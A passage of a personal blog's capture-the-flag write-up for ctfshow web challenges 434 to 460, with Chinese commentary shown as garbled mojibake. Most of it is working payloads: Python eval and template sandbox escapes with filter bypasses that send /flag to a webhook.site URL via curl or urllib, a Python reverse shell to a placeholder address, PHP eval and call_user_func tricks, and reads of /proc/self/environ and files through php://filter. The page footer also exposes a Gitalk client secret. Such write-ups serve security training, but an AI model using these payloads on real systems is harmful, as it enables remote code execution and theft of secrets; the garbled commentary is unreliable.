<pre><code>?code=&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27po%27+%27pen%27](&quot;curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`&quot;)
</code></pre>
<h2 id="web434">web434</h2>
<p>curlä¹Ÿè¢«è¿‡æ»¤äº†<br>
ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p>
<pre><code>?code=&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27po%27+%27pen%27](&quot;cu&quot;+&quot;rl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`&quot;)
</code></pre>
<h2 id="web435">web435</h2>
<h2 id="web436">web436</h2>
<h2 id="web437">web437</h2>
<h2 id="web438">web438</h2>
<h2 id="web439">web439</h2>
<p>ä¸‹åˆ’çº¿ä¹Ÿè¿‡æ»¤äº†ã€‚</p>
<p>ä½†å¯ä»¥ä½¿ç”¨execå‡½æ•°æ‰§è¡Œå¤šè¡Œä»£ç ã€‚</p>
<p>å°†ä»£ç é€†åºã€‚</p>
<pre><code class="language-py">a = 'import os;os.system(&quot;curl https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat /flag`&quot;)'

print(a[::-1])
</code></pre>
<p>è¾“å‡ºè¦æ±‚ä¸ºstrç±»å‹ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨strå‡½æ•°ï¼Œä½¿è¿”å›å€¼ä¸ºstrã€‚</p>
<pre><code>?code=str(exec(%27)&quot;`galf/%20tac`=galf?/ab902d20350b-ed6b-8544-5012-b0289626/etis.koohbew//:sptth%20lruc&quot;(metsys.so;so%20tropmi%27[::-1]))
</code></pre>
<h2 id="web440">web440</h2>
<p>è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·</p>
<p>ä½¿ç”¨chrå‡½æ•°æ¥ç»•è¿‡ã€‚</p>
<pre><code class="language-py">a = 'import os;os.system(&quot;curl https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat /flag`&quot;)'

def chr2chr(a):
    t=''
    for i in range(len(a)):
        if i &lt; len(a)-1:
            t+='chr('+str(ord(a[i]))+')%2b'
        else:
            t+='chr('+str(ord(a[i]))+')'

    return t


print(chr2chr(a))
</code></pre>
<pre><code>?code=str(exec(chr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(32)%2bchr(111)%2bchr(115)%2bchr(59)%2bchr(111)%2bchr(115)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(34)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(115)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(119)%2bchr(101)%2bchr(98)%2bchr(104)%2bchr(111)%2bchr(111)%2bchr(107)%2bchr(46)%2bchr(115)%2bchr(105)%2bchr(116)%2bchr(101)%2bchr(47)%2bchr(54)%2bchr(50)%2bchr(54)%2bchr(57)%2bchr(56)%2bchr(50)%2bchr(48)%2bchr(98)%2bchr(45)%2bchr(50)%2bchr(49)%2bchr(48)%2bchr(53)%2bchr(45)%2bchr(52)%2bchr(52)%2bchr(53)%2bchr(56)%2bchr(45)%2bchr(98)%2bchr(54)%2bchr(100)%2bchr(101)%2bchr(45)%2bchr(98)%2bchr(48)%2bchr(53)%2bchr(51)%2bchr(48)%2bchr(50)%2bchr(100)%2bchr(50)%2bchr(48)%2bchr(57)%2bchr(98)%2bchr(97)%2bchr(47)%2bchr(63)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(96)%2bchr(34)%2bchr(41)))
</code></pre>
<h2 id="web441">web441</h2>
<h2 id="web442">web442</h2>
<p>åˆè¿‡æ»¤äº†æ•°å­—ã€‚</p>
<p>ä½¿ç”¨ä¼ å‚ç»•è¿‡,å‚æ•°åå­—å¤„éœ€è¦ç”¨å¼•å·ï¼Œä½¿ç”¨request.methodæ¥ç»•è¿‡å¼•å·ã€‚</p>
<pre><code>?code=str(exec(request.args.get(request.method)))&amp;GET=import%20os;os.system(&quot;curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`&quot;)
</code></pre>
<h2 id="web443">web443</h2>
<h2 id="web444">web444</h2>
<p>è¿‡æ»¤äº†requestï¼Œåˆ©ç”¨å…¨å±€å˜é‡æ¥è·å–å­—ç¬¦ã€‚</p>
<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))

/?POST=import%20os;os.system(%22curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`%22)
</code></pre>
<h2 id="web445">web445</h2>
<h2 id="web446">web446</h2>
<p>æä¾›äº†æºç </p>
<p>app.py</p>
<pre><code class="language-py">from flask import Flask
from flask import request
import re
import os
del os.system
del os.popen
del imp.reload

app = Flask(__name__)

def Q2B(uchar):
    inside_code = ord(uchar)
    if inside_code == 0x3000:
        inside_code = 0x0020
    else:
        inside_code -= 0xfee0
    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
        return uchar
    return chr(inside_code)

def stringQ2B(ustring):
    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])

@app.route('/',methods=['POST', 'GET'])
def app_index():
    if request.method == 'POST':
        code = request.form['code']
        if code:
        	code = stringQ2B(code)
        	if '\\u' in code:
        		return 'hacker?'
        	if '\\x' in code:
        		return 'hacker?'
        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
        	if reg.search(code)==None:
        		return eval(code)
    return 'where is flag?&lt;!-- /?code --&gt;'

if __name__==&quot;__main__&quot;:
    app.run(host='0.0.0.0',port=80)
</code></pre>
<p>åˆ æ‰äº†os.systemç­‰ç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„åº“ã€‚</p>
<p>åˆ©ç”¨socketã€subprocessæ¥è·å–shellã€‚</p>
<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))

/?POST=import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
</code></pre>
<h2 id="web447">web447</h2>
<p>æºç </p>
<pre><code class="language-py">from flask import Flask
from flask import request
import re
import os
import imp
del os.system
del os.popen
del imp.reload
import subprocess
del subprocess.Popen
del subprocess.call
del subprocess.run
del subprocess.getstatusoutput
del subprocess.getoutput
del subprocess.check_call
del subprocess.check_output
import timeit
del timeit.timeit

app = Flask(__name__)

def Q2B(uchar):
    inside_code = ord(uchar)
    if inside_code == 0x3000:
        inside_code = 0x0020
    else:
        inside_code -= 0xfee0
    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
        return uchar
    return chr(inside_code)

def stringQ2B(ustring):
    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])

@app.route('/',methods=['POST', 'GET'])
def app_index():
    if request.method == 'POST':
        code = request.form['code']
        if code:
        	code = stringQ2B(code)
        	if '\\u' in code:
        		return 'hacker?'
        	if '\\x' in code:
        		return 'hacker?'
        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
        	if reg.search(code)==None:
        		return eval(code)
    return 'where is flag?&lt;!-- /?code --&gt;'

if __name__==&quot;__main__&quot;:
    app.run(host='0.0.0.0',port=80)
</code></pre>
<p>å¯ä»¥ç”¨reloadé‡æ–°ä¸‹å›æ¥åˆ æ‰çš„åº“ã€‚</p>
<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))

/?POST=from%20importlib%20import%20reload;import%20os;reload(os);os.system(%22curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`%22)
</code></pre>
<h2 id="web448">web448</h2>
<p>æºç </p>
<pre><code class="language-py">from flask import Flask
from flask import request
import re
import sys 
sys.modules['os']=None
sys.modules['imp']=None
sys.modules['subprocess']=None
sys.modules['socket']=None
sys.modules['timeit']=None
sys.modules['platform']=None

app = Flask(__name__)

def Q2B(uchar):
    inside_code = ord(uchar)
    if inside_code == 0x3000:
        inside_code = 0x0020
    else:
        inside_code -= 0xfee0
    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
        return uchar
    return chr(inside_code)

def stringQ2B(ustring):
    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])

@app.route('/',methods=['POST', 'GET'])
def app_index():
    if request.method == 'POST':
        code = request.form['code']
        if code:
        	code = stringQ2B(code)
        	if '\\u' in code:
        		return 'hacker?'
        	if '\\x' in code:
        		return 'hacker?'
        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
        	if reg.search(code)==None:
        		return eval(code)
    return 'where is flag?&lt;!-- /?code --&gt;'

if __name__==&quot;__main__&quot;:
    app.run(host='0.0.0.0',port=80)
</code></pre>
<p>payload</p>
<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))

/?POST=import%20sys;del%20sys.modules['os'];import%20os;os.system(%22curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`%22); 
</code></pre>
<h2 id="web449">web449</h2>
<p>æºç </p>
<pre><code class="language-py">from flask import Flask
from flask import request
import re
import sys 
sys.modules['os']=None
sys.modules['imp']=None
sys.modules['subprocess']=None
sys.modules['socket']=None
sys.modules['timeit']=None
sys.modules['platform']=None
sys.modules['sys']=None

app = Flask(__name__)
sys.modules['importlib']=None
del sys

def Q2B(uchar):
    inside_code = ord(uchar)
    if inside_code == 0x3000:
        inside_code = 0x0020
    else:
        inside_code -= 0xfee0
    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
        return uchar
    return chr(inside_code)

def stringQ2B(ustring):
    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])


@app.route('/',methods=['POST', 'GET'])
def app_index():
    if request.method == 'POST':
        code = request.form['code']
        if code:
        	code = stringQ2B(code)
        	if '\\u' in code:
        		return 'hacker?'
        	if '\\x' in code:
        		return 'hacker?'
        	reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
        	if reg.search(code)==None:
        		return eval(code)
    return 'where is flag?&lt;!-- /?code --&gt;'

if __name__==&quot;__main__&quot;:
    app.run(host='0.0.0.0',port=80)
</code></pre>
<p>ä½¿ç”¨å…¶ä»–åº“ï¼Œå‘é€urlè¯·æ±‚ã€‚</p>
<pre><code>code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method)))

/?POST=s=open('/flag').read();import%20urllib;urllib.request.urlopen('https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag='%2bs);
</code></pre>
<h2 id="web450">web450</h2>
<p>æºç Â·</p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
$ctfshow=$_GET['ctfshow'];


if(preg_match('/^[a-z]+[\^][a-z]+[\^][a-z]+$/', $ctfshow)){
    eval(&quot;($ctfshow)();&quot;);
}
</code></pre>
<p>é™åˆ¶å¿…é¡»æ»¡è¶³æ­£åˆ™ï¼Œå«æœ‰ä¸¤ä¸ªå¼‚æˆ–ç¬¦å·ã€‚<br>
è¿›è¡Œä¸¤æ¬¡ç›¸åŒå¼‚æˆ–åˆšå¥½æŠµæ¶ˆã€‚</p>
<pre><code>?ctfshow=phpinfo^phpinfo^phpinfo
</code></pre>
<h2 id="web451">web451</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
$ctfshow=$_GET['ctfshow'];


if(preg_match('/^[a-z]+[\^][a-z]+[\^][a-z]+$/', $ctfshow)){
    if(!preg_match('/phpinfo/', $ctfshow)){
        eval(&quot;($ctfshow)();&quot;);
    }
}
</code></pre>
<p>å¤šäº†ä¸€ä¸ªæ­£åˆ™ï¼Œè¦æ±‚ä¸èƒ½å«æœ‰phpinfo<br>
æ ¹æ®å¼‚æˆ–è¿ç®—æ„é€ ä¸€ä¸‹ã€‚</p>
<pre><code>?ctfshow=phpinfl^aaaaaaa^aaaaaab
</code></pre>
<h2 id="web452">web452</h2>
<p>æºç Â·</p>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
$ctfshow=$_GET['ctfshow'];


if(!preg_match('/\'|\&quot;|[0-9]|\{|\[|\~|\^|phpinfo|\$/i', $ctfshow)){
    eval($ctfshow);
}
</code></pre>
<p>è¿™é‡Œä½¿ç”¨systemå‡½æ•°ï¼Œå‚æ•°ä¸ä½¿ç”¨å¼•å·ï¼Œä¹Ÿèƒ½å¤Ÿè¯†åˆ«ã€‚</p>
<pre><code>/?ctfshow=system(env);
</code></pre>
<h2 id="web453">web453</h2>
<h2 id="web454">web454</h2>
<h2 id="web455">web455</h2>
<h2 id="web456">web456</h2>
<p>æ ¹æ®æç¤ºï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<pre><code class="language-php">file_get_contents($_POST['s'])
</code></pre>
<p>è¯»å–å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚</p>
<pre><code>s=/proc/self/environ
</code></pre>
<h2 id="web457">web457</h2>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
abstract class user{
    public  $username;
    public  $password;
    function __construct($u,$p){
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    }
    abstract  public  function check();
}

class visitor extends user{
    public  function check(){
        return ($this-&gt;username!=='admin' &amp;&amp; $this-&gt;password!=='admin888');
    }
}

class admin extends user{
    public  function check(){
        $u= call_user_func($this-&gt;password);
        return $u=='admin';
    }
}


$u=$_GET['u'];
$p=$_GET['p'];

if(isset($u)&amp;&amp;isset($p)){
    if((new visitor($u,$p))-&gt;check()){
        die('welcome visitor :'.$u);
    }
    if((new admin($u,$p))-&gt;check()){
        die('welcome admin :'.$u.' flag is :'.$flag);
    }
}
</code></pre>
<p>åˆ†æä»£ç é€»è¾‘ï¼Œå¯ä»¥ä½¿ç”¨call_user_funcæ¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œç„¶åæˆåŠŸè°ƒç”¨phpinfoåè¿”å›å€¼ä¸ºtrueï¼Œå¯ä»¥é€šè¿‡åŒç­‰å·çš„åˆ¤æ–­ã€‚</p>
<pre><code>?u=admin&amp;p=phpinfo
</code></pre>
<h2 id="web458">web458</h2>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
abstract class user{
    public  $username;
    public  $password;
    function __construct($u,$p){
        $this-&gt;username=$u;
        $this-&gt;password=$p;
    }
    abstract  public  function check();
}

class visitor extends user{
    public  function check(){
        return ($this-&gt;username!=='admin' &amp;&amp; $this-&gt;password!=='admin888');
    }
}

class admin extends user{
    public  function check(){
        $u= call_user_func($this-&gt;password);
        return $u==='admin';
    }
}


$u=$_GET['u'];
$p=$_GET['p'];

if(isset($u)&amp;&amp;isset($p)){
    if((new visitor($u,$p))-&gt;check()){
        die('welcome visitor :'.$u);
    }
    if((new admin($u,$p))-&gt;check()){
        die('welcome admin :'.$u.' flag is :'.$flag);
    }
}
</code></pre>
<p>è¿™é‡Œæ”¹ä¸ºäº†ä¸‰ç­‰å·ï¼Œè€ƒè™‘å…¶ä»–çš„phpæ— å‚å‡½æ•°ã€‚</p>
<pre><code>get_class (): è·å–å½“å‰è°ƒç”¨æ–¹æ³•çš„ç±»åï¼› 
get_called_class():è·å–é™æ€ç»‘å®šåçš„ç±»åï¼›
</code></pre>
<p>åˆšå¥½è·å¾—çš„ç±»åä¸ºadmin</p>
<pre><code>?u=admin&amp;p=get_class
?u=admin&amp;p=get_called_class
</code></pre>
<h2 id="web459">web459</h2>
<pre><code class="language-php">&lt;?php

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');


$u=$_GET['u'];
$p=$_GET['p'];

if(isset($u)&amp;&amp;isset($p)){
    copy($u, $p.'.php');
}
</code></pre>
<p>åˆ©ç”¨phpä¼ªåè®®è½¬æ¢ç¼–ç ï¼Œæ¥è¯»å–flag.php</p>
<pre><code>/?u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=a
</code></pre>
<h2 id="web460">web460</h2>
<pre><code class="language-py">from flask import Flask
from flask import request
import re
import sys 
from func_timeout import func_set_timeout
import time
import func_timeout
import random

sys.modules['os']=None
sys.modules['imp']=None
sys.modules['subprocess']=None
sys.modules['socket']=None
sys.modules['timeit']=None
sys.modules['platform']=None
sys.modules['sys']=None

app = Flask(__name__)
sys.modules['importlib']=None
del sys

@func_set_timeout(0.7)
def run(s):
    time.sleep(randmon.random())
    return eval(s)

def Q2B(uchar):
    inside_code = ord(uchar)
    if inside_code == 0x3000:
        inside_code = 0x0020
    else:
        inside_code -= 0xfee0
    if inside_code &lt; 0x0020 or inside_code &gt; 0x7e: 
        return uchar
    return chr(inside_code)

def stringQ2B(ustring):
    return &quot;&quot;.join([Q2B(uchar) for uchar in ustring])


@app.route('/',methods=['POST', 'GET'])
def app_index():
    if request.method == 'POST':
        code = request.form['code']
        if code:
            code = stringQ2B(code)
            if '\\u' in code:
                return 'hacker?'
            if '\\x' in code:
                return 'hacker?'
            reg = re.compile(r'os|open|system|read|eval|builtins|curl|_|getattr|{|\'|&quot;|\+|[0-9]|request|len')
            if reg.search(code)==None:
                try:
                    s=run(code)
                    return s
                except func_timeout.exceptions.FunctionTimedOut:
                    return exec('1')
    return 'where is flag?&lt;!-- /?code --&gt;'

if __name__==&quot;__main__&quot;:
    app.run(host='0.0.0.0',port=8080)
</code></pre>
<p>æš‚æ—¶ä¸çŸ¥é“å’‹åšã€‚ã€‚ã€‚</p>
<pre><code>s = 'import urllib.request;import ssl;f=open(&quot;/flag&quot;).read(100);context = ssl._create_unverified_context();url = &quot;http://xxx?1=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)'

</code></pre>

            </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://fallingskies22.github.io/post/ctfshowhei-he-ce-shi/">
                  <h3 class="post-title">
                    [ctfshow]é»‘ç›’æµ‹è¯•
                  </h3>
                </a>
              </div>
            

            
              
                <div id="gitalk-container" data-aos="fade-in"></div>
              

              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>




  
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>

      var gitalk = new Gitalk({
        clientID: '1b08861b8ad19018640e',
        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
        repo: 'fallingskies22.github.io',
        owner: 'fallingskies22',
        admin: ['fallingskies22'],
        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
      })

      gitalk.render('gitalk-container')

    </script>
  

  




  </body>
</html>
